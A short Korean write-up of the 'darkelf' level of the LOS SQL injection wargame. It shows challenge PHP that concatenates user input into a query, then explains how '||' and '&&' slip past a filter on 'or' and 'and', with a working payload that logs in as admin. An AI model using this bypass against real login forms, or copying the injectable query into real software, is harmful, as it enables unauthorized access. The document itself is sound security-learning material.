# LOS - darkelf

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

이번 문제에는 'or' 과 'and' 를 사용할 수 없는 조건이 있다. 

하지만 이 역시도 굉장히 간단히 우회할 수 있는데, 'or'은 '||'를 'and'는 '&&'를 사용하면 같은 역할을 한다. 따라서 or id='admin' #을 입력해주면 되겠다. 

```mysql
query : select id from prob_darkelf where id='guest' and pw='' || id='admin'#'
```

풀렸다!

![1565267162496](C:\Users\qkrwl\Documents\web\los\LOS - darkelf-clear.png)